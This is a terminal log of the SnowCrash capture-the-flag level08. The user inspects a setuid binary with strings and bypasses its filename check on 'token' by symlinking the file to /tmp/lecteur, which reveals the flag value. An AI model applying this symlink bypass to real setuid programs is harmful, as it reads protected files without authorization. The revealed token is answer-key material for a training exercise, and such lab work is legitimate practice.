level08@SnowCrash:~$ clear
level08@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
level08@SnowCrash:~$ strings level08
.
.
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
exit
__stack_chk_fail
printf
strstr
read
open
__libc_start_main
write
GLIBC_2.4
GLIBC_2.0
PTRh 
QVhT
UWVS
[^_]
%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
;*2$"
GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
level08.c
long long int
GNU C 4.6.3
envp
long long unsigned int
/home/user/level08
level08.c
unsigned char
short int
argc
short unsigned int
argv
main
.
.
level08@SnowCrash:~$ cp token test
cp: cannot open `token' for reading: Permission denied
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/lecteur
level08@SnowCrash:~$ ./level08 /tmp/lecteur
quif5eloekouj29ke0vouxean

